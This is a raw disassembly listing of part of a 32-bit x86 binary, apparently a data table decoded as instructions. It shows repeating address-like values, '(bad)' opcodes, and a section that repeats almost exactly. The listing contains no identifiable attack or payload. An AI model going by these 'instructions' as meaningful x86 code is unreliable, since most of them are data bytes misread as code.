  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
